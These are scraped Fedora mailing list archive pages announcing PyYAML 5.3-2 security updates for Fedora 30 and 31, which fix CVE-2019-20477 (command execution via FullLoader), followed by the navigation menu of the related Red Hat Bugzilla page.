* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H.mbox.gz?message=52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/#52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H)

# [SECURITY] Fedora 31 Update: PyYAML-5.3-2.fc31

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

29 Feb
2020

29 Feb
'20

2:32 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2020-3162499159
2020-02-29 22:31:35.495168
--------------------------------------------------------------------------------

Name : PyYAML
Product : Fedora 31
Version : 5.3
Release : 2.fc31
URL : <https://github.com/yaml/pyyaml>
Summary : YAML parser and emitter for Python
Description :
YAML is a data serialization format designed for human readability and
interaction with scripting languages. PyYAML is a YAML parser and
emitter for Python.

PyYAML features a complete YAML 1.1 parser, Unicode support, pickle
support, capable extension API, and sensible error messages. PyYAML
supports standard YAML tags and provides Python-specific tags that
allow to represent an arbitrary Python object.

PyYAML is applicable for a broad range of tasks from complex
configuration files to object serialization and persistence.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2019-20477
--------------------------------------------------------------------------------
ChangeLog:

\* Tue Jan 28 2020 Fedora Release Engineering releng@fedoraproject.org - 5.3-2
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_32_Mass_Rebuild>
\* Mon Jan 6 2020 John Eckersberg eck@redhat.com - 5.3-1
- New upstream release 5.3
\* Tue Dec 3 2019 John Eckersberg eck@redhat.com - 5.2-1
- New upstream release 5.2
\* Fri Nov 22 2019 John Eckersberg eck@redhat.com - 5.1.2-4
- Build without python2 by default (rhbz#1775075)
\* Thu Sep 19 2019 Miro Hron��ok mhroncok@redhat.com - 5.1.2-3
- Stop providing PyYAML from python2-pyyaml, Python now means Python 3
\* Thu Aug 15 2019 Miro Hron��ok mhroncok@redhat.com - 5.1.2-2
- Rebuilt for Python 3.8
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1806005 - CVE-2019-20477 PyYAML: command execution through python/object/apply constructor in FullLoader
<https://bugzilla.redhat.com/show_bug.cgi?id=1806005>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2020-3162499159' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H/#52N5XS73Z5S4ZN7I7R56ICCPCTKCUV4H)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from lists.fedoraproject.org_dec2875c_20250121_003220.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-33VBUY73AA6CTTYL3LRWHNFDULV7PFPN.mbox.gz?message=33VBUY73AA6CTTYL3LRWHNFDULV7PFPN "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/#33VBUY73AA6CTTYL3LRWHNFDULV7PFPN)

# [SECURITY] Fedora 30 Update: PyYAML-5.3-2.fc30

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

29 Feb
2020

29 Feb
'20

4:46 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2020-e84e90dc4a
2020-02-29 22:45:46.940220
--------------------------------------------------------------------------------

Name : PyYAML
Product : Fedora 30
Version : 5.3
Release : 2.fc30
URL : <https://github.com/yaml/pyyaml>
Summary : YAML parser and emitter for Python
Description :
YAML is a data serialization format designed for human readability and
interaction with scripting languages. PyYAML is a YAML parser and
emitter for Python.

PyYAML features a complete YAML 1.1 parser, Unicode support, pickle
support, capable extension API, and sensible error messages. PyYAML
supports standard YAML tags and provides Python-specific tags that
allow to represent an arbitrary Python object.

PyYAML is applicable for a broad range of tasks from complex
configuration files to object serialization and persistence.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2019-20477
--------------------------------------------------------------------------------
ChangeLog:

\* Tue Jan 28 2020 Fedora Release Engineering releng@fedoraproject.org - 5.3-2
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_32_Mass_Rebuild>
\* Mon Jan 6 2020 John Eckersberg eck@redhat.com - 5.3-1
- New upstream release 5.3
\* Tue Dec 3 2019 John Eckersberg eck@redhat.com - 5.2-1
- New upstream release 5.2
\* Fri Nov 22 2019 John Eckersberg eck@redhat.com - 5.1.2-4
- Build without python2 by default (rhbz#1775075)
\* Thu Sep 19 2019 Miro Hron��ok mhroncok@redhat.com - 5.1.2-3
- Stop providing PyYAML from python2-pyyaml, Python now means Python 3
\* Thu Aug 15 2019 Miro Hron��ok mhroncok@redhat.com - 5.1.2-2
- Rebuilt for Python 3.8
\* Wed Jul 31 2019 John Eckersberg eck@redhat.com - 5.1.2-1
- New upstream release 5.1.2
\* Wed Jul 24 2019 Fedora Release Engineering releng@fedoraproject.org - 5.1.1-3
- Rebuilt for <https://fedoraproject.org/wiki/Fedora_31_Mass_Rebuild>
\* Mon Jul 15 2019 Petr Viktorin pviktori@redhat.com - 5.1.1-2
- Remove build dependency on python2-Cython
\* Fri Jun 7 2019 John Eckersberg eck@redhat.com - 5.1.1-1
- New upstream release 5.1.1 (rhbz#1718110)
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1806005 - CVE-2019-20477 PyYAML: command execution through python/object/apply constructor in FullLoader
<https://bugzilla.redhat.com/show_bug.cgi?id=1806005>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2020-e84e90dc4a' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/33VBUY73AA6CTTYL3LRWHNFDULV7PFPN/#33VBUY73AA6CTTYL3LRWHNFDULV7PFPN)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from bugzilla.redhat.com_0deda051_20250121_024008.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1806005)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1806005)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1806005)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1806005

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
